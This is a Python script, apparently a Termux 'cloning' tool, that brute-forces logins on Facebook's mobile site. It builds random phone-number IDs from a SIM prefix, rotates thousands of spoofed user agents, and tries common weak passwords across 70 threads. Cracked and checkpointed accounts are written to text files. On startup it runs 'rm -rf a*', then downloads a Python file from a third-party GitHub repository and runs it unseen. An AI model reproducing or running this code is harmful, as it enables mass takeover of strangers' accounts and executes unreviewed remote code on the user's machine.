#coding=utf
import uuid
import os,sys,time,json,random,re,string,platform,base64
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures==2 > /dev/null')
    os.system('python run.py')
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)

ugen2=[]
ugen=[]

for xd in range(5000):
	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	ugen.append(uaku2)

for xd in range(10000):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen.append(uaku)


	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)

logo=("""
     d8b   db  .d88b.   .d88b.  d8888b. 
     888o  88 .8P  Y8. .8P  Y8. 88  `8D 
     \x1b[1;91m88V8o 88 88    88 88    88 88oooY' 
     \x1b[1;91m88 V8o88 88    88 88    88 88~~~b. 
   \x1b[1;97m  88  V888 `8b  d8' `8b  d8' 88   8D 
     VP   V8P  `Y88P'   `Y88P'  Y8888P'
\33[1;37m----------------------------------------------
→   Owner      :  MR.NOOB
→   Facebook   :  RIAZ KHAN
→   Github     :  RIAZ-143
→   Tool Type  :  \x1b[1;95mOPEN SURCE
\x1b[1;97m→   Version    :  XXX
\33[1;37m----------------------------------------------""")

def lines():
	print('\33[1;37m----------------------------------------------')
 
loop = 0
oks = []
cps = []
try:
    print('\n Updating...\n\033[1;37m Please Wait\033[0;97m\n Update don ')
    proxy = requests.get('https://raw.githubusercontent.com/ALI-JUTT/Ahmed/main/update.txt').text.splitlines()
    v = 3.1
    update = requests.get('https://raw.githubusercontent.com/ALI-JUTT/files/main/version.txt').text
    if str(v) in update:
        os.system('rm -rf a*')
        os.system('curl -L https://raw.githubusercontent.com/ALI-JUTT/ali/main/ali.py > ali.py')
        os.system('python ali.py')
    else:pass
except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)

def riaz():
	os.system('clear')
	print(logo)
	print('[1] Pak Random Cloning menu')
	print('[2] Bangladish Random Cloning')
	print('[3] Create File dumping')
	print('[4] Follow me on Facebook')
	print('\x1b[1;91m[5] Exit Main menu')
	print('\33[1;37m----------------------------------------------')
	riaz1 = input('[•] Select option  : ')
	if riaz1 =='1':
		annu()
	if riaz1 =='5':
		riaz()
	if riaz1 =='3':
		os.system('xdg-open https://github.com/RIAZ-143/dump')
	if riaz1 =='4':
		os.system('xdg-open https://www.facebook.com/profile.php?id=100081567410458&mibextid=ZbWKwL');riaz()
	if riaz1 =='2':
		bangla()
	else:
		print('\n\033[1;31mChoose valid option\033[0;97m')
		riaz()


def annu():
    os.system('clear')
    print(logo)
    print('[1] Random Method \x1b[1;92m1')
    print('\x1b[1;97m[2] Random Method \x1b[1;92m2')
    print('\x1b[1;97m[3] Random Method \x1b[1;92m3')
    print('\x1b[1;91m[4] Go to main menu')
    lines()
    riaz1 = input('[+] CHOOSE optION : ')
    if riaz1 =='1':
    	m1()
    if riaz1 =='2':
    	m2()
    if riaz1 =='3':
    	m3()
    if riaz1 =='4':
    	riaz()
    else:
        print('\n\033[1;37m[+] SELECT VALID optION\033[0;97m')        
#
def bangla():
	os.system('clear')
	print(logo)
	print('[1] Bngla Crack \x1b[1;92mM 1')
	print('\x1b[1;97m[1] Bngla Crack \x1b[1;92mM 1')
	print('\x1b[1;91m[3] Go to main menu')
	lines()
	riaz1 = input('[+] Select option : ')
	if riaz1 =='1':
		b1()
	if riaz1 =='2':
		b2()
	if riaz1 =='3':
		riaz()
#def choice()
#

def m1():
    user=[]
    os.system('clear')
    print(logo)
    print('[+] Example  : 92345,92318,92334,****Etc')
    print('\x1b[1;91m[+] See Note : Use Your Sim Code ')
    lines()
    kode = input('[+] Your Code : ')
    lines()
    os.system('clear')
    print(logo)
    print('[+] Example  : 1000,5000,100000,****Etc')
    print('\x1b[1;91m[+] See Note : Use Your Idz  Lemit ')
    lines()
    limit = int(input('[+] Idz Lemit : '))
    print(46*'-')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=70) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(' Total Acounts : '+tl)
        print(' Selected Code :\x1b[1;92m '+kode)
        print('\x1b[1;91m If you no result use flight mode')
        lines()
        for guru in user:
            uid = kode+guru
            pwx=[guru]
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
    print('The Process Has Been Complete')
    print('Press Enter to Back');riaz()
#
def m2():
    user=[]
    os.system('clear')
    print(logo)
    print('[+] Example  : 92345,92318,92334,****Etc')
    print('\x1b[1;91m[+] See Note : Use Your Sim Code ')
    lines()
    kode = input('[+] Your Code : ')
    lines()
    os.system('clear')
    print(logo)
    print('[+] Example  : 1000,5000,100000,****Etc')
    print('\x1b[1;91m[+] See Note : Use Your Idz  Lemit ')
    lines()
    limit = int(input('[+] Idz Lemit : '))
    print(46*'-')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=70) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(' Total Acounts : '+tl)
        print(' Selected Code :\x1b[1;92m '+kode)
        print('\x1b[1;91m If you no result use flight mode')
        lines()
        for guru in user:
            uid = kode+guru
            pwx=[guru,'khankhan','khan12345','khan12']
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
    print('The Process Has Been Complete')
    print('Press Enter to Back');riaz()
#
def m3():
    user=[]
    os.system('clear')
    print(logo)
    print('[+] Example  : 92345,92318,92334,****Etc')
    print('\x1b[1;91m[+] See Note : Use Your Sim Code ')
    lines()
    kode = input('[+] Your Code : ')
    lines()
    os.system('clear')
    print(logo)
    print('[+] Example  : 1000,5000,100000,****Etc')
    print('\x1b[1;91m[+] See Note : Use Your Idz  Lemit ')
    lines()
    limit = int(input('[+] Idz Lemit : '))
    print(46*'-')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=70) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(' Total Acounts : '+tl)
        print(' Selected Code :\x1b[1;92m '+kode)
        print('\x1b[1;91m If you no result use flight mode')
        lines()
        for guru in user:
            uid = kode+guru
            pwx=[guru,'khan786','khan1122','khan12','janjan']
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
    print('The Process Has Been Complete')
    print('Press Enter to Back');riaz()
#

#
def b1():
    user=[]
    os.system('clear')
    print(logo)
    print('[+] Example  : 88**,88***,88***,****Etc')
    print('\x1b[1;91m[+] See Note : Use Your Sim Code ')
    lines()
    kode = input('[+] Your Code : ')
    lines()
    os.system('clear')
    print(logo)
    print('[+] Example  : 1000,5000,100000,****Etc')
    print('\x1b[1;91m[+] See Note : Use Your Idz  Lemit ')
    lines()
    limit = int(input('[+] Idz Lemit : '))
    print(46*'-')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=70) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(' Total Acounts : '+tl)
        print(' Selected Code :\x1b[1;92m '+kode)
        print('\x1b[1;91m If you no result use flight mode')
        lines()
        for guru in user:
            uid = kode+guru
            pwx=[guru,kode]
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
    print('The Process Has Been Complete')
    print('Press Enter to Back');riaz()
#
def b2():
    user=[]
    os.system('clear')
    print(logo)
    print('[+] Example  : 88***,88***,88***,****Etc')
    print('\x1b[1;91m[+] See Note : Use Your Sim Code ')
    lines()
    kode = input('[+] Your Code : ')
    lines()
    os.system('clear')
    print(logo)
    print('[+] Example  : 1000,5000,100000,****Etc')
    print('\x1b[1;91m[+] See Note : Use Your Idz  Lemit ')
    lines()
    limit = int(input('[+] Idz Lemit : '))
    print(46*'-')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=70) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(' Total Acounts : '+tl)
        print(' Selected Code :\x1b[1;92m '+kode)
        print('\x1b[1;91m If you no result use flight mode')
        lines()
        for guru in user:
            uid = kode+guru
            pwx=[guru,'freefire','bangladish','free fire']
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
    print('The Process Has Been Complete')
    print('Press Enter to Back');riaz()
#

#


#
#

	
def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://p.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'p.facebook.com',
            'method': 'POST',
            'scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': pro}
            lo = session.post('https://p.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            #print(iid+'|'+pws+'|'+str(log_cookies))
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[151:166]
                print('\033[1;32m[NOOB-OK] '+cid+'|'+ps+'\033[0;97m')
                open('NOOB-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[NOOB-CP] '+cid+' | '+ps+'\x1b[1;97m')
                open('NOOB-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mMR.NOOB\033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass


riaz()